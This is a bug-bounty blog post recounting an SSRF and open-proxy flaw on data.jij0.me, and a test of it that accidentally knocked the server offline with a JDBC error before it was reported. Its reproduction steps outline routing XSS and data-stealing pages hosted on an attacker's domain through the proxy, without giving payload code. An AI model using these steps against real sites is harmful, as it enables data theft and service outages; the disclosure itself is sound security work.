---
title: 'The SSRF that Brought down a Server'
metaTitle: 'SSRFtoDOS'
metaDesc: 'dev@jijo:~$whoami'
socialImage: images/ssrf.png
date: '2023-01-07'
tags:
  - dupe ssrf bug
---

# The SSRF that Brought down a Server

## How we got there

Server-Side Request Forgery (SSRF) is a type of web vulnerability that allows an attacker to send a malicious request from a vulnerable server to another server or network service. The attack is performed by manipulating a server-side script to send a request to a different server or service, which can be controlled by the attacker.

An SSRF vulnerability can be exploited in a number of ways, such as gaining unauthorized access to internal network resources, stealing sensitive information, or performing a denial of service (DoS) attack.

For example, if a server-side script is using user-supplied data to construct a URL and the script doesn't properly validate or sanitize the input, an attacker could craft a special URL that would cause the script to send a request to a server or service controlled by the attacker. This can allow the attacker to access sensitive information, such as internal network IP addresses or even steal data or perform further attacks.

It's important to note that SSRF is not only limited to web-based systems, it could be found in any application or service that can make an outgoing request to another service, such as a command-line tool or a mobile app. Therefore, it's important for developers to be aware of SSRF and ensure that user-supplied input is properly sanitized and validated before being used in any kind of request.

Recently, I discovered a Server-Side Request Forgery (SSRF) vulnerability on the website [data.jij0.me](/post/why). The website contains an endpoint called "proxy" that allows for the rendering of other webpages or websites under the context of data.jij0.me. This vulnerability can be exploited in a number of ways, such as stealing user information through Cross-Origin Resource Sharing (CORS) or performing a reflected cross-site scripting (XSS) attack.

data.jij0.me contains a proxy [https://data.jij0.me/proxy?url= ] endpoint that can be utilized to render other webpages or websites under the context of data.jij0.me
I found that this can be utilized to steal user info via to cors or perform reflected xss

## Reproduction Steps

tep-by-Step Reproduction of SSRF Vulnerability on data.jij0.me:

1. Visit the following URL: <https://data.jij0.me/proxy?url=https://example.com>
2. The website should render the example.com domain within the context of data.jij0.me.
3. To exploit the vulnerability through reflected XSS, host an XSS HTML file on a domain you control.
4. Use the "proxy" endpoint by visiting the following URL: <https://data.jij0.me/proxy?url=https://your-controlled-domain.com/xss-file.html>
5. This should execute the XSS attack within the context of data.jij0.me.
6. To exploit the vulnerability through CORS stealing, host a CORS stealing HTML file on a domain you control.
7. Use the "proxy" endpoint by visiting the following URL: <https://data.jij0.me/proxy?url=https://your-controlled-domain.com/cors-stealing-file.html>
8. This should steal data from the data.jij0.me website and send it to your controlled domain.
9. It also could cause a Hit GenericJDBCException resulting in a JDBC lock and potentially taking the server down.

## The JDBC Lock

When testing out my CORs stealing file the worst came happend `(As a bug hunter, this is one of your worst nightmare)`, my test seemed to not properly process at first so i started probing around to see if i could include the `/api/v1/*` response from their api to my server.
Boom, out of nowhere i saw a `500 Error :: JDBC error`, I had no idea what that was at the moment and assumed its just another snag in the journey.

```bash

A JDBC lock is a type of lock that is used to control concurrent access to a database by multiple users or applications. It is implemented using the Java Database Connectivity (JDBC) API, which is a Java-based application programming interface (API) for connecting to relational databases.

A JDBC lock is used to prevent multiple users from modifying the same data simultaneously, which can cause data inconsistencies. When a user requests a lock on a specific database resource, the database management system (DBMS) checks if the resource is available. If the resource is available, the lock is granted, and the user can access and modify the data. If the resource is already locked by another user, the DBMS will put the requesting user in a queue to wait for the lock to be released.

A JDBC lock can be implemented at different levels of granularity, such as at the row, table, or even the entire database level.

In the scenario described above, the vulnerability is causing a "Hit GenericJDBCException" which is potentially resulting in a JDBC lock which could take the server down. This could happen if the JDBC lock is not releasing after a certain amount of time, or if multiple requests are being made at the same time, causing the server to become overwhelmed.
```

I decided to continue only to see the sdame error, i read the stack trace on the 500 error page and saw a line that said `jdbc lock....`, my mind went `crap`,

> i remembered reading a blog some years back about how a bughunter was testing race condition on a payment page of a bugbounty program and hit the same error causing other people not to be able to use the website to buy stuff. Ahaaah turns out this wasn't really new to me, just hadn't experienced it first hand.

At this point i knew i f*ed up, i started wishing that it was only the proxy endpoints, but as we all know wishes are always just wishes, and if they were horses bergars would ride. I opened up the root of the website in my browser and would you know it, JDBC error everywhere, so i know now for sure i have f**ed. I even thought that the issue affected only my network, so i tested on other IPs and devices and i realised that the server was down for everyone.

I started to tense up as hell, i didn't know how the program would react.

![basic](/images/poc/dos.png)

## Report

I found this same bug present in two other enviroments, dev, beta.
So i wrote up a detailed reports and reported, duped this ones.
![basic](/images/poc/dup.png)

I also contacted the program as fast as i could to tell them about the jdbc lock, the server was back online in an hour or so, `i never got to know if the server autorestarted or an alert was created by the Siems and IT restarted the server`

## Contacts

### @[github](https://github.com/crypt0g30rgy)  @[twitter](https://twitter.com/crypt0g30rgy) @[LinkedIn](https://www.linkedin.com/in/george-maina-waithaka-95a465214/)   @[Intigriti](https://app.intigriti.com/profile/g30rgyth3d4rk) @[hackerone_old](https://hackerone.com/crypt0p3n3tr4t0r?type=user)
